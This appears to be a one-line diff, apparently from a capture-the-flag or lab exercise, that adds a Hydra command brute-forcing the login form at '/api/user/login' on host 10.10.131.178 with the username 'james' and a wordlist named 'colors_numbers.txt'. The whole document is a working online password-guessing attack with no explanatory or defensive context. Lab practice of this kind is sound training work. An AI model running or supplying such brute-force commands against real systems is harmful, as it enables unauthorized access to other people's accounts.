@@ -1,0 +1,1 @@
+hydra -l james -P colors_numbers.txt -f -vV 10.10.131.178 http-form-post "/api/user/login:username=^USER^&password=^PASS^:F=Invalid Username Or Password"
